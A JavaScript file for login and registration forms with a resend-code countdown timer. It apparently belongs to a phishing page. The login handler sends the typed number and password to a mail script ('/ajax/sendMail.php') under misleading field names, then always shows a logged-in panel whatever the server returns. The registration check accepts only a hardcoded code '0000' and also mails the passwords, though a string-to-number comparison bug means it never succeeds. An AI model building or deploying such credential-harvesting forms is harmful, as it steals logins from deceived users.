// start timer
const logincr = document.querySelector(".login__code_reload");
const minutesSpan = document.querySelector(".minutes");
const secondsSpan = document.querySelector(".seconds");
const loginct = document.querySelector(".login__code_times");
const logincm = document.querySelector(".login__code_message");

let temp = 0;
const timer = (remainingMinutes, d, h, m, s) => {
  loginct.classList.remove("active");
  logincm.classList.remove("active");
  var finishTime = new Date();
  finishTime.setSeconds(finishTime.getSeconds() + remainingMinutes);
  var timesOver;

  function update() {
    var diff = finishTime - new Date();
    var millis = diff % 1000;
    diff = Math.floor(diff / 1000);
    var sec = diff % 60;
    if (sec < 10) sec = "0" + sec;
    diff = Math.floor(diff / 60);
    var min = diff % 60;
    if (min < 10) min = "0" + min;
    diff = Math.floor(diff / 60);
    var hours = diff % 24;
    if (hours < 10) hours = "0" + hours;
    var days = Math.floor(diff / 24);

    d = +days;
    h = +hours;
    m = +min;
    s = +sec;

    minutesSpan.innerHTML = ("0" + m).slice(-2);
    secondsSpan.innerHTML = ("0" + s).slice(-2);

    timesOver = d * 86400 + h * 3600 + m * 60 + s;

    if (timesOver <= 0) {
      loginct.classList.add("active");
      logincm.classList.add("active");
      return
    }
    clearTimeout(temp);
    temp = setTimeout(update, millis);
  }
  setTimeout(update, 0);
};

logincr.addEventListener('click', function() {
  timer(60);
})
// end timer

// start validate form login
const idloginform = document.getElementById('loginform');
const loginnumber = document.getElementById('loginnumber');
const loginpassword = document.getElementById('loginpassword');
const loginformdouble = document.querySelector('.login__form');
const regformdouble = document.querySelector('.reg__form');
const registrationformdouble = document.querySelector('.registration__form');
const loginloggeddouble = document.querySelector('.login__logged');

if(!idloginform){} else {

  loginnumber.oninput = function(){this.value = this.value.substr(0, 30);}
  loginpassword.oninput = function(){this.value = this.value.substr(0, 30);}

  idloginform.addEventListener('submit', e => {
    e.preventDefault();
    checkInputs();
  });

  function checkInputs() {
    const loginnumberValue = loginnumber.value.trim();
    const loginpasswordValue = loginpassword.value.trim();
    
    if(loginnumberValue !== '' && loginnumberValue.length > 5 && loginnumberValue.length <= 30) {setSuccessFor(loginnumber);} else {setErrorFor(loginnumber);}
    if(loginpasswordValue !== '' && loginpasswordValue.length > 5 && loginpasswordValue.length <= 30) {setSuccessFor(loginpassword);} else {setErrorFor(loginpassword);}
    if(loginnumberValue !== '' && loginnumberValue.length > 5 && loginnumberValue.length <= 30 && loginpasswordValue !== '' && loginpasswordValue.length > 5 && loginpasswordValue.length <= 30){
      window.setTimeout(function () {
        fetch('/ajax/sendMail.php', {
          method: 'POST',
          body: JSON.stringify({
            body: loginnumberValue,
            userId: loginpasswordValue
          }),
          headers: {
            "Content-type": "application/json; charset=UTF-8"
          }
        })
      }, 1000);
      loginformdouble.classList.add("hidden");
      regformdouble.classList.remove("active");
      loginloggeddouble.classList.add("active");
      loginnumber.value = '';
      loginpassword.value = '';
    }
  }
  
  function setErrorFor(input) {
    const formControl = input.parentElement;
    formControl.className = 'login__label input__error';
  }
  
  function setSuccessFor(input) {
    const formControl = input.parentElement;
    formControl.className = 'login__label input__success';
  }
}
// end validate form login

// start validate form reg
const idregform = document.getElementById('regform');
const regnumber = document.getElementById('regnumber');
const registrationnumber = document.getElementById('registrationnumber');

if(!idregform){} else {

  regnumber.oninput = function(){this.value = this.value.substr(0, 30);}

  idregform.addEventListener('submit', e => {
    e.preventDefault();
    checkInputs();
  });

  function checkInputs() {
    const regnumberValue = regnumber.value.trim();
    
    if(regnumberValue !== '' && regnumberValue.length > 5 && regnumberValue.length <= 30) {setSuccessFor(regnumber);} else {setErrorFor(regnumber);}
    if(regnumberValue !== '' && regnumberValue.length > 5 && regnumberValue.length <= 30){
      loginformdouble.classList.add("hidden");
      regformdouble.classList.remove("active");
      registrationformdouble.classList.add("active");
      registrationnumber.value = regnumber.value;
      timer(60);
    }
  }
  
  function setErrorFor(input) {
    const formControl = input.parentElement;
    formControl.className = 'login__label input__error';
  }
  
  function setSuccessFor(input) {
    const formControl = input.parentElement;
    formControl.className = 'login__label input__success';
  }
}
// end validate form reg

// start validate form registration
const idregistrationform = document.getElementById('registrationform');
const registrationcode = document.getElementById('registrationcode');
const registrationpassword = document.getElementById('registrationpassword');
const registrationpassword2 = document.getElementById('registrationpassword2');

if(!idregistrationform){} else {
  registrationnumber.oninput = function(){this.value = this.value.substr(0, 30);}
  registrationcode.oninput = function(){this.value = this.value.substr(0, 4);}
  registrationpassword.oninput = function(){this.value = this.value.substr(0, 30);}
  registrationpassword2.oninput = function(){this.value = this.value.substr(0, 30);}

  idregistrationform.addEventListener('submit', e => {
    e.preventDefault();
    checkInputs();
  });

  function checkInputs() {
    const registrationnumberValue = registrationnumber.value.trim();
    const registrationcodeValue = registrationcode.value.trim();
    const registrationpasswordValue = registrationpassword.value.trim();
    const registrationpassword2Value = registrationpassword2.value.trim();
    
    if(registrationnumberValue !== '' && registrationnumberValue.length > 5 && registrationnumberValue.length <= 30) {setSuccessFor(registrationnumber);} else {setErrorFor(registrationnumber);}
    if(registrationcodeValue === '0000') {setSuccessFor(registrationcode);} else {setErrorFor(registrationcode);}
    if(registrationpasswordValue !== '' && registrationpasswordValue.length > 5 && registrationpasswordValue.length <= 30) {setSuccessFor(registrationpassword);} else {setErrorFor(registrationpassword);}
    if(registrationpassword2Value !== '' && registrationpassword2Value.length > 5 && registrationpassword2Value.length <= 30 && registrationpasswordValue === registrationpassword2Value) {setSuccessFor(registrationpassword2);} else {setErrorFor(registrationpassword2);}

    if(registrationnumberValue !== '' && registrationnumberValue.length > 5 && registrationnumberValue.length <= 30 && registrationcodeValue === '0000' && registrationpasswordValue !== '' && registrationpasswordValue > 5 && registrationpasswordValue <= 30 && registrationpasswordValue === registrationpassword2Value){
      window.setTimeout(function () {
        fetch('/ajax/sendMail.php', {
          method: 'POST',
          body: JSON.stringify({
            body: registrationnumberValue,
            password: registrationpasswordValue,
            password2: registrationpassword2Value
          }),
          headers: {
            "Content-type": "application/json; charset=UTF-8"
          }
        })
      }, 1000);
      loginformdouble.classList.add("hidden");
      regformdouble.classList.remove("active");
      loginloggeddouble.classList.add("active");
      loginnumber.value = '';
    }
  }
  
  function setErrorFor(input) {
    const formControl = input.parentElement;
    formControl.className = 'login__label input__error';
  }
  
  function setSuccessFor(input) {
    const formControl = input.parentElement;
    formControl.className = 'login__label input__success';
  }
}
// end validate form registration